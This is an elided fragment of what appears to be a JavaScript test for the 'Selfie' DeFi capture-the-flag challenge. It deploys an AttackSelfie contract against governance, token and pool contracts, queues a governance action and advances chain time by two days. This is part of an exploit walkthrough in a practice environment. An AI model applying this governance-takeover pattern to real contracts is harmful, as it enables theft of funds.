...
describe('[Challenge] Selfie', function () {
  ...
  it('Execution', async function () {
    ...
    const factory = await ethers.getContractFactory('AttackSelfie', deployer);
    const attackContract = await factory.deploy(governance.address, token.address, pool.address, player.address);
    await attackContract.queue();
    await ethers.provider.send('evm_increaseTime', [2 * 3600 * 24]); //2 days
